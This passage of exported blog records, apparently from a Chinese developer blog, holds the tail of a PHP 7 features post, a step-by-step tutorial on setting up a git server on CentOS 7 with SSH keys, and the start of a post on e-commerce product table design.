style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">yield</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">from</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> gen2</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">();</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> gen2</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">()</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">yield</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">3</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">yield</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">4</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">foreach</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">gen</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">()</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">as</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> $val</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">)</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    echo $val</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> PHP_EOL</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">?&gt;</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">以上实例会输出：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">2</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">3</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">4</span></span></pre><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">整除</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">新增了整除函数 intdiv(),使用实例：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\nvar_dump</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">intdiv</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">10</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">3</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">));</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">?&gt;</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\"><span style=\"color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;font-size:14px;background-color:rgb(255,255,255);\"></span></span></p><p style=\"color:rgb(51,51,51);line-height:2em;margin-bottom:0px;border:0px;background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">以上实例会输出：</span></p><pre class=\"prettyprint prettyprinted\" style=\"margin:15px auto;padding:10px 15px;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;color:rgb(51,51,51);border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);white-space:pre-wrap;\"><span style=\"font-size:16px;\"><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">int</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">3</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">)</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\"><span style=\"color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;background-color:rgb(255,255,255);\">更多内容可以参考：</span><a href=\"http://www.runoob.com/php/php7-new-features.html\" rel=\"nofollow\" style=\"border:0px;margin:0px;padding:0px;color:rgb(100,133,76);text-decoration:underline;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;background-color:rgb(255,255,255);\">http://www.runoob.com/php/php7-new-features.html</a><br></span></p><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><br></p>                                    </div>", "log_PostTime": 1584891047, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "centos7 下搭建git服务器", "log_Intro": "centos7 下搭建git服务器", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">总的来说，搭建git和svn形式差不多<br style=\"margin:.2em;\">1.首先要在服务器安装git环境，创建用户密码和仓库等<br style=\"margin:.2em;\">2.然后个人主机（基本是window）安装git客户端<br style=\"margin:.2em;\">3.将个人主机客户端的秘钥写到git服务器的一个文件中（这点和SVN不一样）用于认证改客户端免输入密码，其实这个步骤可以不用，就每次传文件要输入密码而已。<br style=\"margin:.2em;\">4.通过git服务器设置的账号密码以及IP地址进行克隆和添加上传项目文件</span></p><h2 class=\"line\" style=\"padding:0px 0px .3em;font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;line-height:1.225;margin-top:0px;margin-bottom:14px;border-bottom:1px solid rgb(238,238,238);color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><span><a style=\"color:rgb(65,131,196);background-color:transparent;\"></a></span>centos7 下搭建git服务器</span></h2><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">参考文档：<a href=\"https://www.cnblogs.com/liter7/p/6581344.html\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">https://www.cnblogs.com/liter7/p/6581344.html</a><br style=\"margin:.2em;\">1.使用putty工具登录服务器，安装git<br style=\"margin:.2em;\">先从yum安装git</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">yum install git</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/2e85623b4fbc306a21d9380ccf2d5634_623x160.png\" style=\"border:0px none;vertical-align:top;\"><br style=\"margin:.2em;\">2.在需要的位置创建一个裸仓库（最后以.git结尾）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">cd /usr/local #仓库目录<br style=\"margin:.2em;\">mkdir git #创建git文件夹<br style=\"margin:.2em;\">cd git #进入git文件夹<br style=\"margin:.2em;\">git init --bare learngit.git #在这个目录创建一个裸仓库</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">3.创建一个git用户并赋予密码</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">useradd git<br style=\"margin:.2em;\">passwd git</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/e956c354d8e3976f960ef29d6e7345fe_556x199.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">4.赋予git用户权限</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">chown -R git:git learngit.git</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">5.禁用git用户shell登录（一定要禁用）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">vi /etc/passwd<br style=\"margin:.2em;\">　　将git用户修改为如下（一般在最后一行，修改按\tI，修改完成按esc，输入<br style=\"margin:.2em;\">：wq! 完成保存退出编辑）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">git:x:1000:1000::/home/git:/usr/bin/git-shell<br style=\"margin:.2em;\">其他的不用改。服务端完成。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">客户端</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">我使用的客户端为git for windows</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">1.安装，从网站https://git-scm.com/downloads 下载安装</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/1213fedc215063e06f272eec489f65a7_1015x593.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">安装这个下一步下一步就不写了</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">2.进入想要将项目放置的目录，这个就是你安装完成后在一个文件夹里右键 git bash可以用命令进行操作</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">3.创建用户</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">git config --global <a href=\"http://user.name/\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">user.name</a> \"你的名字\"<br style=\"margin:.2em;\">git config --global user.email \"你的邮箱\"</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/3fd3156c35f0ef2e0eaafcb09c5ebcbf_529x425.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">4.创建秘钥（用来防止每次commit或push都需要密码，就和上面的总结一样，3和4部无非就是）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">ssh-keygen -t rsa -C \"你的邮箱\"<br style=\"margin:.2em;\">　　一直回车....</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">5.将秘钥加入服务器列表</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">5.1 取得公钥（本地）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">在当前目录下(若未改变目录，到C:\\Users\\Administrator.ssh\\id_rsa.pub)找到.ssh目录下的id_rsa.pub文件，使用notepad++或其他软件打开，复制其中内容（类似如下：<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/f899464f60dfca7a8b7f3444290446ac_677x299.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq+DNXnrzPoGJe3uCObDG7DcMMotWght/QNZnnO39FLzin+xMj+cOGpwbi5PSRqUwVrq4So7uuQGz2xyLb3vjHYK3z7SG/Sk/HdQctvbIVo+NugXbgmopm25Ps518aDuQ7w8nlPY3IvxTqH1U2ijoCdqgnVrwKCCPf7QY/2HGI+nDbF+s6cCX4CIkhwWnWhJXVqmSxbPSA8sX/2NE71gwhypLLfH8PG8nHr36zSfCdf0/DASdzJD7wE3cdlvICT82TmmqZLPWgYQv+4zNjbuPpzupp5zBIN+piS9VfBv+RdFEtx3oPk3Ou0z1tR9T5Lpe55b+U.......... 你的邮箱<br style=\"margin:.2em;\">　　　　）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">5.2 将公钥加入服务器列表（服务器）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">CentOS 7默认列表在/root/.ssh/authorized_keys，使用vi 编辑此文件输入刚才复制的内容，保存退出。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">vi /root/.ssh/authorized_keys<br style=\"margin:.2em;\">//i修改<br style=\"margin:.2em;\">//esc后输入:wq保存退出<br style=\"margin:.2em;\">也可以用wincp工具直接找到文件打开添加</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/ede071ee67c44cd79c9c7bf745262165_879x358.png\" style=\"border:0px none;vertical-align:top;\"><br style=\"margin:.2em;\">5.3 可以跳过此步，若克隆远程项目多次仍然需要密码，则检查上一步是否有错误，没有错误后，在配置这一步（服务器）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">在/home目录下创建.ssh目录，进入，创建authorized_keys文件</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">cd /home<br style=\"margin:.2em;\">mkdir .ssh<br style=\"margin:.2em;\">cd .ssh<br style=\"margin:.2em;\">vi authorized_keys<br style=\"margin:.2em;\">　　　　加入我们的公钥后保存退出。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">6.克隆远程项目（本地）同样用右键GIT bash就可以了</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">cd E:<br style=\"margin:.2em;\">cd git<br style=\"margin:.2em;\">//把ip换成自己服务器的<br style=\"margin:.2em;\">git clone <a href=\"mailto:git@123.206.26.208\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">git@123.206.26.208</a>:/usr/local/git/learngit.git</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">7.如果需要密码123，输入你设置的git用户密码，若clone之后commit多此后仍然需要密码，执行5.3，若已经执行，检查公钥是否正确，然后退出git for windows，再此打开git for windows克隆。<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/116d9a441160715527f1a66b618801d1_631x66.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/e4ba63a1a6e45cf5e9d878e460c2072e_617x283.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">关于git的使用可参考以下文档：<a href=\"http://www.runoob.com/git/git-basic-operations.html\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">http://www.runoob.com/git/git-basic-operations.html</a></span></p><p style=\"margin-bottom:0px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">当然也可以右键选择GIT GUI 直观以下的工具操作。<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/c59c03048e21a21da7423be404d47cfe_816x537.png\" style=\"border:0px none;vertical-align:top;\"></span></p>                                    </div>", "log_PostTime": 1584891048, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "电商商品模块数据设计与关系图", "log_Intro": "电商商品模块数据设计与关系图", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><span style=\"font-size:16px;\">最近在忙商城的项目的底层数据表的搭建，以下是我通过对ECshop和TPshop的数据表结构分析后，做出兼容我们公司的表设计。仅供参考，有其他建议欢迎留言，希望能与大家共同学习。</span></p><p><span style=\"font-size:16px;\">1. <strong>商品分类的逻辑</strong></span></p><p><span style=\"font-size:16px;\"><strong><span style=\"font-family:'宋体';\">表名</span>:cs_goods_category <span style=\"font-family:'宋体';\">备注</span>: 商品分类表</strong></span></p><table><tbody><tr><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">字段名</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">数据类型</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">默认值</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">允许非空</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">是否递增</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">备注</span></strong></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">id</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">是</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td></tr><tr><td><p align=\"center\"><span 